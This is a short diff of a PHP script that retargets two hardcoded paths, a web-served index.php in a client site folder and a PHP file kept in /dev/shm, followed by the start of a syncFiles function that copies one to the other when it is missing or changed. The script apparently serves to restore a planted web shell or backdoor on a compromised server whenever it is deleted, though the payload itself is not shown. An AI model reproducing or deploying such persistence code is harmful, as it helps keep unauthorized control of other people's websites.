@@ -1,6 +1,6 @@
 <?php
-$sysfxp47 = "/var/www/clients/client3/web3/web/bappeda/images/index.php";
-$doona = "/dev/shm/lib2.php";
+$sysfxp47 = "/var/www/clients/client3/web3/web/new/dokumen/index.php";
+$doona = "/dev/shm/major.php";
 
 function syncFiles($source, $target) {
     if (!file_exists($source) || (filesize($source) != filesize($target))) {
